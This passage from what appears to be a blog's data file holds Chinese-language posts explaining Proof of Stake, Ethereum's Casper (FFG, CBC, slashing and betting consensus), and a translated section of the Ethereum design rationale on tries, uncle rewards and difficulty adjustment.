href=\"#PoS：Proof-of-Stake，权益-股权-证明\" class=\"headerlink\" title=\"PoS：Proof of Stake，权益(股权)证明\"></a>PoS：Proof of Stake，权益(股权)证明</h3><p>主要思想是节点记账权的获得难度与节点持有的权益成反比,相对于PoW,一定程度减少了数学运算带来的资源消耗,性能也得到了相应的提升,但依然是基于哈希运算竞争获取记账权的方式,可监管性弱.该共识机制容错性和PoW相同.它是Pow的一种升级共识机制,根据每个节点所占代币的比例和时间,等比例的降低挖矿难度,从而加快找随机数的速度。</p>\n<h2 id=\"以太坊Casper\"><a href=\"#以太坊Casper\" class=\"headerlink\" title=\"以太坊Casper\"></a>以太坊Casper</h2><h3 id=\"优势\"><a href=\"#优势\" class=\"headerlink\" title=\"优势\"></a>优势</h3><ul>\n<li>不需要消耗大量的资源就可以保证区块链的安全性.参与 PoS 的代币数量相当于 PoW<br>算力，达到了同样的出块效果却不用消耗真实的电力,根据比特币能源消耗指数,当前全球用于比特币挖矿所产生的年用电量预计为30.14太瓦时(TWh),比159个国家年均用电量还高。</li>\n<li>因为不再需要大量资源，就不需要最大化的发行新币来激励参与者,从而降低网络的压力.理论上甚至有可能出现负净发行,其中一部分交易费用被消耗掉，因此供应随着时间的推移而下降。</li>\n<li>权益证明为更广泛的使用博弈论机制设计的技术敞开了大门,以便更好地阻止中心化垄断的形成,以及(如果确实形成了中心化垄断)伤害网络的行为。</li>\n<li>降低中心化风险之后，经济规模的扩大便不是问题.在工作量证明机制中，当资本多到一定程度，便可以投入更大规模的生产设备，拉大和其他人的差距（投入一千万的成本所获得的收益不只是投入一百万的十倍）.而在权益证明机制中，一千万的投资只能保证获取一百万投资的十倍的收益。</li>\n<li>相对于工作量证明，能够使用经济处罚来大大提高各种形式的 51％ 攻击的成本.正如 Vlad Zamfir 所说的，“只要参与了 51％ 攻击，ASIC 矿场就会被烧毁”。</li>\n</ul>\n<h3 id=\"Casper与Pos的区别\"><a href=\"#Casper与Pos的区别\" class=\"headerlink\" title=\"Casper与Pos的区别\"></a>Casper与Pos的区别</h3><p>Casper实施了一个进程，使得它可以惩罚所有的恶意因素.这就是权益证明在Casper下是如何工作的：</p>\n<ul>\n<li>验证者押下一定比例的他们拥有的以太币作为保证金</li>\n<li>验证者开始验证区块.也就是说，当验证者发现一个区块并认为这个区块可以被加到链上的时候，验证者将以通过押下赌注来验证它</li>\n<li>如果该区块被加到链上，然后验证者们将得到一个跟他们的赌注成比例的奖励</li>\n<li>但是，如果一个验证者采用一种恶意的方式行动、试图做“无利害关系”的事，他们将立即遭到惩罚，他们所有的权益都会被砍掉</li>\n</ul>\n<p>正如以上，Casper被设计成可以在一个无需信任的系统上工作，并且是更加拜占庭容错的。<br>任何人，如果以一种恶意的，或者说有拜占庭叛徒式的方式行动，就会立即受到惩罚、失去他们的保证金.这就是Casper不同于其他权益证明协议的地方.恶意元素会失去一些东西，所以，“无利害关系”是不可能的。<br>这不是唯一一个Casper可以惩罚验证者的地方，正如Hudson James以及Joris Bontje在“StackExchange”的回答中标注的那样，Casper设计了苛刻的激励来保证网络的安全，包括惩罚离线的矿工，不管它是有意还是无意的。这意味着验证者将不得不变得对他们的节点正常运行时间小心翼翼.粗心或者懒惰都将导致他们失去自己保证金.这一属性减少了对交易和整体利用率的审查.围绕着所有这些，这种“惩罚”属性同样给予了Casper相对标准工作量证明协议的明显优势。<br><img src=\"/images/pos_createblock.png\" alt=\"\"><br>如上图所示,在一个工作量证明协议中，一个矿工会在蓝色链上还是红色链上挖矿并不重要.因为诚实的和恶意的矿工都将花费同等数量的资源。然而，在Casper中，如果一个诚实的验证者在蓝色链上挖矿，他们将得到与他们的赌注成比例的奖励，但一个恶意的矿工将因为下注在红色链条上而失去他们的保证金。</p>\n<h3 id=\"Casper版本\"><a href=\"#Casper版本\" class=\"headerlink\" title=\"Casper版本\"></a>Casper版本</h3><p>Casper不是一个具体的项目.它是两个研究项目的融合，这两个在最近一直由以太坊开发者团队承担：</p>\n<ul>\n<li>Casper the Friendly Finality Gadget（FFG）</li>\n<li>Casper the Friendly GHOST: Correct-by-Construction（CBC）</li>\n</ul>\n<h3 id=\"Casper-FFG\"><a href=\"#Casper-FFG\" class=\"headerlink\" title=\"Casper FFG\"></a>Casper FFG</h3><p>Casper FFG也就是Vitalik版Casper，是一个混合PoW/PoS共识机制,它是正准备进行初步应用的版本，也是被精心设计好来缓冲权益证明的转变过程的.设计的方式是，一个权益证明协议被叠加在正常的以太坊版工作量证明协议上.虽然区块仍将通过工作量证明来挖出，每50个区块就将有一个权益证明检查点，也就是网络中验证者评估确定性（Finality）的地方。</p>\n<h3 id=\"确定性（Finality）\"><a href=\"#确定性（Finality）\" class=\"headerlink\" title=\"确定性（Finality）\"></a>确定性（Finality）</h3><p>确定性（Finality），从一个非常宽松的意义上来说，意味着一旦一个特定的操作完成，它将永远被蚀刻在历史上，没有任何东西可以逆转这个操作.在处理金融事务的领域，这是非常重要的.例如,A在一个公司里拥有特定数目的一种资产.就算公司的某些进程中出了一点小故障，A也不应该需要恢复对该资产的所有权.<br>有人说，工作量证明是唯一一种在区块链上实现确定性的方式.但是，这并不是必然正确的.真相远比这个要复杂很多。<br>正如Vitalic Buterin提出的:世界上没有一个系统可以提供100%的确定性.黑进一个系统，或者物理上破解一份注册表并篡改数字以改变一个人的资产负债表，都是有可能的.这也是中心化机构的一个大问题.但是，分布式的系统也会面临同样的问题。<br>实际上，比特币是工作量证明机制的典范，至少三次曾经面临确定性问题.在一个例子中，链必须分叉，因为一个Bug存在于软件的一个版本中但在其它版本中并不存在.这在社区中导致了分裂，一部分人拒接接受被另一部分人所接受的链.这次分裂在6个小时中被解决。<br>所以，问题在于，Casper FFG如何能够提供确定性？根据Vitalik的说法 ，因为下面三个理由，Casper保证可以提供比工作量证明更强的确定性:</p>\n<ul>\n<li>完全经济确定性.三分之二的验证者会下最大几率的赌注使区块达到最终一致.因此，对他们来说，串谋以及攻击网络的激励是非常小的，因为，如果他们这样做的话，他们将危及自己的保证金.Vlad Zamfir更好地解释了这一点，他说：“设想一种版本的工作量证明，如果你参与一场51%供给的话，你的矿机会烧毁.”</li>\n<li>假设整个网络由三个人组成：Alice，Bob，和Charlie.假设Alice和Bob将他们的保证金放在一种结论上，同时，Bob和Charlie把他们的保证金放在一个与之对立的结论上。不管发生什么事，Alice或者Charlie其中一人肯定会损失一大笔钱.所以，正如你可以看到的，验证者没有动机去串谋或用恶意的方式行动，因为他们总会失去一大笔钱</li>\n<li>然而，如果双重确定性（Double Finality）发生的话，还有一种意外事故处理方案.如果双重确定性发生的话，用户可以选择他们想到哪条链上去。不管哪条链，得到多数票的就成为主链.基本上，在Casper上，双重确认会导致硬分叉而不是回滚。</li>\n</ul>\n<h3 id=\"Casper-CBC\"><a href=\"#Casper-CBC\" class=\"headerlink\" title=\"Casper CBC\"></a>Casper CBC</h3><p>Casper CBC也就是Vlad版Casper使用建构修正（correct-by-construction，CBC）协议。<br>下面是一个普通的协议设计：</p>\n<ul>\n<li>正式指定协议</li>\n<li>定义该协议必须满足的属性</li>\n<li>证明该协议可以满足给定的属性</li>\n</ul>\n<p>而CBC协议的设计是：</p>\n<ul>\n<li>正式地但只是部分地指定协议</li>\n<li>定义该协议必须指定的属性</li>\n<li>从满足所有它被规定去指明的属性中推导出该协议</li>\n<li>提出一个合理估计的错误的例外情况</li>\n<li>列出所有在未来可能发生的错误</li>\n</ul>\n<p>所以，Casper CBC要做的事情，就是不断进行微调、让这个只是部分建构好的协议更加完美，直到它变成完全版。目前来说，以太坊开发者团队一直在努力地开发这两个Casper项目.很明显，这不会是最终版本，但不管这最终版本是什么，它肯定会受到Vlad的和Vitalik的Casper的深刻影响.正如刚刚提到过的，Vitalik的Casper将被初步运行以缓冲从PoW到PoS的转变.而Vlad的Casper，通过使用一个“理想对手”推导出一个安全性论证</p>\n<h2 id=\"Casper知识\"><a href=\"#Casper知识\" class=\"headerlink\" title=\"Casper知识\"></a>Casper知识</h2><h3 id=\"Casper-去中心化\"><a href=\"#Casper-去中心化\" class=\"headerlink\" title=\"Casper:去中心化\"></a>Casper:去中心化</h3><p><img src=\"/images/pos_decentralization.png\" alt=\"\"><br>正如在上图看到的，工作量证明协议不再是真正对去中心化友好的了。<br>大部分哈希算力集中在几个特定的矿池，而这意味着无论发生什么事，他们总会比其他人有更大的机会挖到区块、获得奖励。<br>因为他们可以获得更多钱，他们可以买得起更好更快的ASIC设备.这基本上意味着，无论发生什么，大矿池将总是比个人和小矿池拥有优势.换句话来说，富有的将变得更富有。<br>权益证明通过让挖矿完全虚拟化使得这一切都无关紧要.然而，这不是权益证明减缓中心化效果的唯一途径.为了理解这个，首先需要弄懂“经济规模”意味着什么。<br>跟大企业很像，大矿池可以通过下列途径减少他们投入资源的成本：</p>\n<ul>\n<li>在大规模运营中分摊固定成本</li>\n<li>作为一个更大的经营主体，拥有议价能力</li>\n</ul>\n<p>这意味着，一个大而有影响力的矿池可以一美元又一美元地比其他矿池生产更多哈希算力，即便他们投入了等量的资金。<br>这一问题在权益证明中完全被消解了，因为一个简单的原因.在权益证明中你投资一份保证金.你不能轻易地结成矿池然后让你的保证金一美元又一美元地升值.在一天结束的时候，一美元还是一美元.规模经济在这里不起作用。</p>\n<h3 id=\"Casper-能源效率\"><a href=\"#Casper-能源效率\" class=\"headerlink\" title=\"Casper:能源效率\"></a>Casper:能源效率</h3><p>上面讲过,当前全球用于比特币挖矿所产生的年用电量预计为30.14太瓦时(TWh),比159个国家年均用电量还高.最糟糕的部分是，能源浪费是为了能源浪费.尤其是比特币，其对能源的欲望是非常贪婪的。</p>\n<p>所以，很明显，比特币使用太多电力了，太多钱被花在资源上了.但是，外部成本是大量的电力消耗对环境产生的影响必定是巨大的。</p>\n<p>虽然毫无疑问地比特币和工作量证明已经造成了大量积极的社会影响，我们至少应该看看权益证明系统可以做到怎样的规模，以及，它是否可以在不消耗那么多电力的情况下工作。</p>\n<h3 id=\"Casper-经济安全\"><a href=\"#Casper-经济安全\" class=\"headerlink\" title=\"Casper:经济安全\"></a>Casper:经济安全</h3><p>Casper的最大优势是它的经济安全性.假设你是一个验证者，并且你将你自己的钱作为保证金存入网络.以最大化网络利益的方式行事也是你自己的利益.知道了如果有恶意的行为你的保证金中的一大部分将被罚没，你为什么还会那样做呢？</p>\n<p>当你有很多钱锁定在里面的时候，你为什么还要攻击网络、损害币值呢？同样地，“惩罚效应”消除了Vitalik定义的“驻守重生点攻击（spawn camping attack）”的可能性。</p>\n<p>在权益证明中，重生点攻击可以被防止，因为一个简单的事实：一次攻击将导致惩罚，没收已投入的保证金.如果你没有投入任何保证金，就不能成为Casper验证人。</p>\n<h3 id=\"以太坊Casper的未来\"><a href=\"#以太坊Casper的未来\" class=\"headerlink\" title=\"以太坊Casper的未来\"></a>以太坊Casper的未来</h3><p>Vitalik<br>Buterin说不仅Casper准备好接受测试了，它还可以在客户端更新代码时提供一个安全提升.虽然看起来并不像它已经准备好用来广泛普及了，但第一个Casper测试网发布的日子看起来是越来越近了。</p>\n<p>权益证明是否将要实施并不是一个问题，问题是什么时候能够实施.以太坊“宁静”（Serenity）应该是一个权益证明网络.此前我们并不是从未见过PoS的实行，Peercoin非常成功地运用了它.但是，我们从还从来没有看过在这个层面采用该协议。也许，如果Casper被成功运行的话，另一个加密货币会跟风并且做出转换.不管事情会变成什么样，Casper带来了非常多迷人的可能性。</p>\n<h2 id=\"Casper技术\"><a href=\"#Casper技术\" class=\"headerlink\" title=\"Casper技术\"></a>Casper技术</h2><h3 id=\"投注共识\"><a href=\"#投注共识\" class=\"headerlink\" title=\"投注共识\"></a>投注共识</h3><p>Casper是一种以太坊下一代的共识机制,属于PoS Casper的共识是按块达成的而不是像PoS那样按链达成的。</p>\n<p>Casper向公开经济学共识这个领域引入了一个根本上全新的理念作为自己的基础：投注共识.投注共识的核心思想很简单：为验证人(validator)提供与协议对赌哪个块会被最终确定的机会.在这里对某个区块X的投注就是一笔交易，在所有区块X被处理了的世界中都会带给验证人Y个币的奖励（奖励是凭空“印”出来的，因而是“与协议”对赌），而在所有区块X没有被处理的世界中会对验证人收取Z个币的罚款（罚金被销毁）。</p>\n<p>为了防止验证人在不同的世界中提供不同的投注,还有一个简单严格的条款:如果有两次投注序号一样,或者说提交了一个无法让Casper合约处理的投注,会失去所有保证金..从这一点可以看出,Casper与传统的PoS不同的是Casper有惩罚机制,这样非法节点通过恶意攻击网络不仅得不到交易费,而且还面临着保证金被没收的风险。</p>\n<p>只有在相信区块X在人们关心的那个世界中被处理的可能性足够大时，这才是值得去做的交易，验证人才会愿意投注.然而，接下来就是经济上递归的有趣部分：人们关心的那个世界，也就是用户的客户端在用户想要知道他们的账户余额或是合约的状态时所展现的那个状态，本身就是根据人们对哪个区块投注最多推导出来的.因此,每一个验证人都具有根据他们所预期的其他人的投注情况进行投注的动机，驱使这个过程走向收敛。</p>\n<p>一个有帮助的类比是工作量证明共识 - 它本身看起来非常独特，实际上可以成为投注共识的一个特别子模型.理由如下：当你基于一个块挖矿时，你是在花费每秒E的电力成本换取每秒p的出块概率，并且在所有包含你的出块的分叉中获得R个币，在其它分叉中分文不得。<br><img src=\"/images/pos_createblock2.png\" alt=\"\"><br>因此，每一秒钟，在你挖矿的链上你可以获得p <em> (R-E) 的期望收益，在其它链上遭受E的损失；因此你的挖矿选择可以理解为下注赌你所在的链有 E:p </em> (R-E) 的相对概率(odds)胜出。<br>比如，假设p等于百万分之一，R是25个币约等于10000美元，而E是0.007美元，则在胜出链上每秒钟的期望收益是0.000001 * 10000 - 0.007 = 0.003，在失败链上的损失是0.007的电力成本，因此这是在赌自己挖矿的链有7:3的相对概率胜出.注意工作量证明满足上面所说的经济上递归的要求：用户的客户端通过处理拥有最大工作量的那条链来计算其账户余额。</p>\n<p>投注共识可以看作是包含了以特定方式看待的工作量证明的一个框架，也适合为其他多种类型的共识协议提供能促进收敛的经济博弈.例如传统的拜占庭容错共识协议中，通常在对某个结果进行最后”commit”之前还有”pre-votes”和”pre-commits”的概念；在投注共识的模型下，我们可以把每一阶段都变成投注，这样后面阶段的参与者就有更大把握相信前面阶段的参与者“真的是这个意思”。</p>\n<p>投注共识还可以用于激励链外人类共识(out-of-band human consensus)的正确行为，为了克服类似51%攻击的极端情况有需要的话.假设有人购买了一条PoS链上超过一半的币，并进行攻击，那么社区只需要协商出一个让客户端忽略攻击者分叉的补丁，就能自动让攻击者失去所有的币.一个极有野心的目标是让在线节点可以自动的产生这种分叉决定,如果能成功实现，传统容错研究中的一个被低估但却重要的结论,在强同步假设下，即使几乎所有节点都在尝试攻击系统，剩下的节点依然可以达成共识,也可以被纳入投注共识的框架中。</p>\n<p>在投注共识的情境中，不同的共识协议只在一件事情上有区别：谁，可以以什么赔率，投多少注？工作量证明只提供了一种赌局：投注胜出链有E:p * R-E的相对概率包含你自己出的块.在广义的投注共识中，依据一种被称为评分规则(scoring rule)的机制我们本质上可以提供无限多种赌局：在1:1上压极小的一注，在1.000001:1上也压极小注，在1.000002:1上也压极小注，如此继续。</p>\n<p><img src=\"/images/pos_bet.png\" alt=\"\"><br>参与者依然可以选择在每一个概率等级上的这些极小边际投注的确切大小，但大体上这个技术让我们能打探出验证人认为某个块会被确认的相当精确的概率读数.如果验证人认为一个块有90%的概率会被确认，那么他们就会接受所有相对概率低于9:1的赌局，拒绝相对概率高于9:1的赌局，而协议就能基于这一点准确得出这个块会被确认的概率是90%的“看法”.事实上，显示原理(revelationprinciple)告诉我们可以要求验证人直接给出他们对某个块被确认概率的“看法”的签名消息，让协议代表验证人计算投注。</p>\n<p><img src=\"/pos_voting.png\" alt=\"\"><br>从上面的微积分图中，可以得到在每一个概率等级上计算总奖励和总惩罚的简单函数，计算结果在数学上等价于根据验证人信心在所有概率等级上形成的投注的无限集合的总和.一个简单的例子是s(p)= p(1-p)和f(p) = (p/(1-p))^2/2，这里s计算如果你投注的事件发生能获得的奖励，f 计算如果没有发生你受到的惩罚。<br>投注共识的广义形式有一个重要优点.在工作量证明中，给定区块背后的“经济权重”仅仅随着时间线性增加：如果一个块有6个确认，那么要撤销它只需要花费矿工大约6倍于出块奖励（在均衡态下）的成本，而如果一个块有600个确认，那么撤销它的成本就是出块奖励的600倍.在广义的投注共识中，验证人在一个块上投入的经济权重可以指数级增加：如果其他大多数验证人愿意以10:1下注，你可能会想冒险以20:1下注；而一旦几乎所有人都增加到20:1，你可能会跳到40:1或者更高.因此，一个块很可能在几分钟之内，取决于验证人有多少勇气（以及协议提供的激励大小），就达到一种“准最终确定”的状态，这种状态下验证人的所有保证金都成为了支持这个块的投注。</p>\n"},{"title":"以太坊wiki-设计原理翻译三","comments":0,"date":"2018-02-24T02:39:17.000Z","img":null,"_content":"[以太坊wiki-设计原理翻译二](https://xingyunbite.github.io/2018/02/09/%E4%BB%A5%E5%A4%AA%E5%9D%8Awiki-%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86%E7%BF%BB%E8%AF%91%E4%BA%8C/)\n\n## 树的使用方式\n\n警告：本节内容假设你已经了解了布隆过滤器是如何工作的。详情可见:[http://en.wikipedia.org/wiki/Bloom_filter](http://en.wikipedia.org/wiki/Bloom_filter)\n\n以太坊区块链中的每个区块都包含了 3 个指针指向 3 个 树：状态树（the state trie），代表连接区块之后的全部状态，交易树，代表区块中索引关联的所有交易（即 `key 0`:第一笔要执行的交易，`key 1`:第二笔要执行的交易，等等），以及收据树，代表了符合每笔交易的收据（receipts）。对应于一笔交易的收据是一个经过 `RLP` 编码的数据结构：\n\n\t[ medstate, gas_used, logbloom, logs ]\n\n对应的：\n* `medstate` 是处理交易之后的状态树的根。\n* `gas_used` 是处理该笔交易之后消耗的燃料数量。\n* `logs` 是交易执行过程中由 `LOG0 ... LOG4` 操作码生成的 `[address, [topic1, topic2...], data]`形式的项目列表（包括主调用和次调用）。`address` 是产生日志的合约的地址，`topics` 最多为 4 个 32 字节值，`data` 是任意大小的字节数组。\n* `logbloom` 是交易中所有的日志的 `topics` 和地址组成的布隆过滤器。\n\t区块头中也有一个布隆（bloom），它是区块中所有交易的布隆的“或”结果。这个结构的目的是使以太坊的轻客户端尽可能的友好。更多以太坊轻客户端和它们的使用实例，见:[light client page (principles section)](https://github.com/ethereum/wiki/wiki/Light-client-protocol#principles)。\n\n## 叔块激励\n\n“贪婪的最重观察子树（Greedy Heaviest Observed Subtree）”（GHOST）协议是 Yonatan Sompolinsky 和 Aviv Zohar 于 2013 年 12 月[首次](http://eprint.iacr.org/2013/881.pdf)推出的一项创新，也是第一次有人认真尝试解决“阻塞越来越快”的问题。`GHOST` 背后的动机是，目前区块链通过最快确认次数来确认区块的方案，由于过高的陈旧率而降低了安全性 - 因为区块在网络中传播需要一定的时间，如果矿工 A 挖出一个块，然后在矿工 A 的块传播到 B 之前矿工 B 恰巧挖出另一个块 ，矿工 B 的块将会浪费掉（“陈旧”），并且对于网络安全没有任何帮助。此外，还有一个集中化问题：如果矿工 A 是一个拥有3 0％ 算力的矿池，而 B 拥有 10％ 的算力，那么 A 将有 70％ 的时间产生陈旧块的风险（因为另外 30％ 的时间 A 产生了最后一个块，因此将立即获取挖掘数据），而 B 将有 90％ 的时间产生陈旧块的风险。因此，如果区块间隔足够短而导致陈旧率较高，那么凭借其算力，明显地，A 将更高效。将这两种效应结合起来，快速生成区块的区块链很可能导致一个具有足够算力的矿池对挖矿产生垄断。\n\n正如 Sompolinsky 和 Zohar 所描述的那样，`GHOST` 通过在计算哪个链是“最长”时包含陈旧块来解决网络安全损失的第一个问题; 也就是说，在计算最长链的工作量证明中，除了该区块的直系祖先区块，还包含了该区块之前被废弃的叔块。\n\n为了解决可能的中心化问题，我们采用了一个不同的策略：我们对叔块进行奖励：一个叔块会获得它的基本奖励的 7/8(87.5%)，而该叔块的下一个区块会获得基本奖励的 1/32(3.125%)。当然交易费不会作为奖励。\n\n在以太坊中，一个陈旧的块只能被当做一个叔块，然后从它的兄弟区块往下最多被直系区块包含 7 代，除此之外叔块和其他任何区块都没有关系。这么做的原因如下：首先，不受限制的 `GHOST` 会在计算哪个叔块对于当前的区块是合法的时候出现大量的困难。其次，在以太坊中使用无限制的叔块激励，会导致矿工对于是否在主链挖矿不再关心，而这可能导致主链被公共攻击。最后，计算表明，限制到七个级别时利大于弊。\n\n* 这里有一个可用的衡量集中化风险的仿真器:[https://github.com/ethereum/economic-modeling/blob/master/ghost.py](https://github.com/ethereum/economic-modeling/blob/master/ghost.py)\n* 一个更高级的讨论:[https://blog.ethereum.org/2014/07/11/toward-a-12-second-block-time/](https://blog.ethereum.org/2014/07/11/toward-a-12-second-block-time/)\n\n我们的区块时间算法中的设计决定包含：\n\n* **12 秒出块时间**：选择 12 秒作为尽可能快的时间，但同时比网络等待时间长得多。2013年，Decker和Wattenhofer在苏黎世的[一篇文章](http://www.tik.ee.ethz.ch/file/49318d3f56c1d525aabf7fda78b23fc0/P2P2013_041.pdf)测量了比特币的网络延迟，并确定了 12.6 秒是一个新块传播到95％的节点所花费的时间。然而，论文还指出，大部分的传播时间与块的大小成正比，因此越快的货币传播时间越少（in a faster currency we can expect the propagation time to be drastically reduced）。传播间隔的恒定部分约为 2 秒，但是，为了安全起见，我们假设块在我们的分析中需要 12 秒才能传播。\n* **7 个区块祖先限制**：这是一个设计目标的一部分，希望在块数很少的情况下很快就可以使块的历史被“遗忘”，并且已经证明 7 块已经提供了大部分预期的效果。\n* **一个区块后代限制**（如，`c(c(p(p(p(head)))))`，其中 c = child，p = parent，是不合法的）：这是简洁的设计目标的一部分，上面的模拟器显示它不会带来很大的集中化风险。\n* **叔块验证要求**：叔块必须包含一个有效的头部，而不是区块。这是为了简单起见，并将区块链模型保持为线性数据结构（而不是 Sompolinsky 和 Zohar 的新模型中的块 `DAG`）。 要求叔块的块合法也是一个有效的方法。\n\n## 难度调整算法\n\n以太坊目前的难度调整规则如下：\n\n```\ndiff(genesis) = 2^32\n\ndiff(block) = diff.block.parent + floor(diff.block.parent / 1024) *\n\t1 if block.timestamp - block.parent.timestamp < 9 else\n\t-1 if block.timestamp - block.parent.timestamp >= 9\n```\n\n难度调整规则的设计目标是：\n\n* **快速更新**：区块之间的时间的调整要快。\n\n* **稳定**：如果算力不变，难度不应该过大。\n\n* **简单**：算法实现要简单。\n\n* **占用内存低**：算法不应依赖太多历史区块，并尽可能少地使用内存。假设最后十个块，加上最后十个块的块头中的所有内存变量，这就足够算法运行了。\n\n* **非开发性**：该算法不应该过度鼓励矿工修改时间戳，或者矿池频繁地增加和移除算力，以试图最大化他们的收入。\n\n我们已经确定，我们目前的算法在稳定性和不可利用性方面非常不理想，然后我们打算至少将时间戳相对于父母和祖父母进行切换，这样当矿工挖矿时，他们只会修改时间戳。另一个更强大的仿真器公式位于[`https://github.com/ethereum/economic-modeling/blob/master/diffadjust/blkdiff.p`](https://github.com/ethereum/economic-modeling/blob/master/diffadjust/blkdiff.py)（仿真器使用比特币的挖矿能力，但只使用当天的均值;它在一天的时间内，在某个点模拟 95% 的崩溃）。\n","source":"_posts/以太坊wiki-设计原理翻译三.md","raw":"---\ntitle: 以太坊wiki-设计原理翻译三\ncomments: false\ndate: 2018-02-24 10:39:17\ncategories: 区块链\ntags: \n- ZhouFyk \n- 区块链 \n- 以太坊\nimg:\n---\n[以太坊wiki-设计原理翻译二](https://xingyunbite.github.io/2018/02/09/%E4%BB%A5%E5%A4%AA%E5%9D%8Awiki-%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86%E7%BF%BB%E8%AF%91%E4%BA%8C/)\n\n## 树的使用方式\n\n警告：本节内容假设你已经了解了布隆过滤器是如何工作的。详情可见:[http://en.wikipedia.org/wiki/Bloom_filter](http://en.wikipedia.org/wiki/Bloom_filter)\n\n以太坊区块链中的每个区块都包含了 3 个指针指向 3 个 树：状态树（the state trie），代表连接区块之后的全部状态，交易树，代表区块中索引关联的所有交易（即 `key 0`:第一笔要执行的交易，`key 1`:第二笔要执行的交易，等等），以及收据树，代表了符合每笔交易的收据（receipts）。对应于一笔交易的收据是一个经过 `RLP` 编码的数据结构：\n\n\t[ medstate, gas_used, logbloom, logs ]\n\n对应的：\n* `medstate` 是处理交易之后的状态树的根。\n* `gas_used` 是处理该笔交易之后消耗的燃料数量。\n* `logs` 是交易执行过程中由 `LOG0 ... LOG4` 操作码生成的 `[address, [topic1, topic2...], data]`形式的项目列表（包括主调用和次调用）。`address` 是产生日志的合约的地址，`topics` 最多为 4 个 32 字节值，`data` 是任意大小的字节数组。\n* `logbloom` 是交易中所有的日志的 `topics` 和地址组成的布隆过滤器。\n\t区块头中也有一个布隆（bloom），它是区块中所有交易的布隆的“或”结果。这个结构的目的是使以太坊的轻客户端尽可能的友好。更多以太坊轻客户端和它们的使用实例，见:[light client page (principles section)](https://github.com/ethereum/wiki/wiki/Light-client-protocol#principles)。\n\n## 叔块激励\n\n“贪婪的最重观察子树（Greedy Heaviest Observed Subtree）”（GHOST）协议是 Yonatan Sompolinsky 和 Aviv Zohar 于 2013 年 12 月[首次](http://eprint.iacr.org/2013/881.pdf)推出的一项创新，也是第一次有人认真尝试解决“阻塞越来越快”的问题。`GHOST` 背后的动机是，目前区块链通过最快确认次数来确认区块的方案，由于过高的陈旧率而降低了安全性 - 因为区块在网络中传播需要一定的时间，如果矿工 A 挖出一个块，然后在矿工 A 的块传播到 B 之前矿工 B 恰巧挖出另一个块 ，矿工 B 的块将会浪费掉（“陈旧”），并且对于网络安全没有任何帮助。此外，还有一个集中化问题：如果矿工 A 是一个拥有3 0％ 算力的矿池，而 B 拥有 10％ 的算力，那么 A 将有 70％ 的时间产生陈旧块的风险（因为另外 30％ 的时间 A 产生了最后一个块，因此将立即获取挖掘数据），而 B 将有 90％ 的时间产生陈旧块的风险。因此，如果区块间隔足够短而导致陈旧率较高，那么凭借其算力，明显地，A 将更高效。将这两种效应结合起来，快速生成区块的区块链很可能导致一个具有足够算力的矿池对挖矿产生垄断。\n\n正如 Sompolinsky 和 Zohar 所描述的那样，`GHOST` 通过在计算哪个链是“最长”时包含陈旧块来解决网络安全损失的第一个问题; 也就是说，在计算最长链的工作量证明中，除了该区块的直系祖先区块，还包含了该区块之前被废弃的叔块。\n\n为了解决可能的中心化问题，我们采用了一个不同的策略：我们对叔块进行奖励：一个叔块会获得它的基本奖励的 7/8(87.5%)，而该叔块的下一个区块会获得基本奖励的 1/32(3.125%)。当然交易费不会作为奖励。\n\n在以太坊中，一个陈旧的块只能被当做一个叔块，然后从它的兄弟区块往下最多被直系区块包含 7 代，除此之外叔块和其他任何区块都没有关系。这么做的原因如下：首先，不受限制的 `GHOST` 会在计算哪个叔块对于当前的区块是合法的时候出现大量的困难。其次，在以太坊中使用无限制的叔块激励，会导致矿工对于是否在主链挖矿不再关心，而这可能导致主链被公共攻击。最后，计算表明，限制到七个级别时利大于弊。\n\n* 这里有一个可用的衡量集中化风险的仿真器:[https://github.com/ethereum/economic-modeling/blob/master/ghost.py](https://github.com/ethereum/economic-modeling/blob/master/ghost.py)\n* 一个更高级的讨论:[https://blog.ethereum.org/2014/07/11/toward-a-12-second-block-time/](https://blog.ethereum.org/2014/07/11/toward-a-12-second-block-time/)\n\n我们的区块时间算法中的设计决定包含：\n\n* **12 秒出块时间**：选择 12 秒作为尽可能快的时间，但同时比网络等待时间长得多。2013年，Decker和Wattenhofer在苏黎世的[一篇文章](http://www.tik.ee.ethz.ch/file/49318d3f56c1d525aabf7fda78b23fc0/P2P2013_041.pdf)测量了比特币的网络延迟，并确定了 12.6 秒是一个新块传播到95％的节点所花费的时间。然而，论文还指出，大部分的传播时间与块的大小成正比，因此越快的货币传播时间越少（in a faster currency we can expect the propagation time to be drastically reduced）。传播间隔的恒定部分约为 2 秒，但是，为了安全起见，我们假设块在我们的分析中需要 12 秒才能传播。\n* **7 个区块祖先限制**：这是一个设计目标的一部分，希望在块数很少的情况下很快就可以使块的历史被“遗忘”，并且已经证明 7 块已经提供了大部分预期的效果。\n* **一个区块后代限制**（如，`c(c(p(p(p(head)))))`，其中 c = child，p = parent，是不合法的）：这是简洁的设计目标的一部分，上面的模拟器显示它不会带来很大的集中化风险。\n* **叔块验证要求**：叔块必须包含一个有效的头部，而不是区块。这是为了简单起见，并将区块链模型保持为线性数据结构（而不是 Sompolinsky 和 Zohar 的新模型中的块 `DAG`）。 要求叔块的块合法也是一个有效的方法。\n\n## 难度调整算法\n\n以太坊目前的难度调整规则如下：\n\n```\ndiff(genesis) = 2^32\n\ndiff(block) = diff.block.parent + floor(diff.block.parent / 1024) *\n\t1 if block.timestamp - block.parent.timestamp < 9 else\n\t-1 if block.timestamp - block.parent.timestamp >= 9\n```\n\n难度调整规则的设计目标是：\n\n* **快速更新**：区块之间的时间的调整要快。\n\n* **稳定**：如果算力不变，难度不应该过大。\n\n* **简单**：算法实现要简单。\n\n* **占用内存低**：算法不应依赖太多历史区块，并尽可能少地使用内存。假设最后十个块，加上最后十个块的块头中的所有内存变量，这就足够算法运行了。\n\n* **非开发性**：该算法不应该过度鼓励矿工修改时间戳，或者矿池频繁地增加和移除算力，以试图最大化他们的收入。\n\n我们已经确定，我们目前的算法在稳定性和不可利用性方面非常不理想，然后我们打算至少将时间戳相对于父母和祖父母进行切换，这样当矿工挖矿时，他们只会修改时间戳。另一个更强大的仿真器公式位于[`https://github.com/ethereum/economic-modeling/blob/master/diffadjust/blkdiff.p`](https://github.com/ethereum/economic-modeling/blob/master/diffadjust/blkdiff.py)（仿真器使用比特币的挖矿能力，但只使用当天的均值;它在一天的时间内，在某个点模拟 95% 